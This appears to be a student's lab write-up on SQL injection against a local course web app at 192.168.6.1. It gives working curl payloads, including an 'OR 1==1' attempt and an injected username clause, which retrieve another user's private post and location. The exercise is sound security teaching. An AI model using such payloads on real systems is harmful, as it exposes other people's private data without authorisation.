Reference to send post request by curl:
https://gist.github.com/subfuzion/08c5d85437d5d4f00e58
SQL statement reference:
https://www.w3schools.com/sql/sql_where.asp

By inspecting the request in firefox, we can get the request data is: picture=nasi-lemak.jpg
We can guess the sql statement is something like:
SELECT * FROM table 
WHERE $picture 

Then we try this sql injection as the lecture slides mentioned:
 curl -d "picture=roti-canai.jpg 'OR 1==1;--" -X POST 192.168.6.1/thought

However, it only shows the thoughts which username is aditya. So the sql statement may specify the username as well and it is like:
SELECT * FROM table
WHERE $picture AND username=’aditya’ 

We can change to specify username as alice as well, and use semicolon to silence username=’aditya’:
curl -d "picture=char-kway-teow.jpg' AND username='alice';" -X POST 192.168.6.1/thought

Fortunately, we get alice’s thought:
The best char kway teow is Penang char kway teow

This is the piece of response:
<center><img src='/img/char-kway-teow.jpg' AND username='alice';' align='middle'><table border=1>
<tr><th>Username</th><th>Picture</th><th>Thought</th>
<tr><td>alice</td><td>char-kway-teow.jpg</td><td>The best char kway teow is Penang char kway teow (lat: 5.411135 / lng: 100.330454)</td></tr>
</table></center>

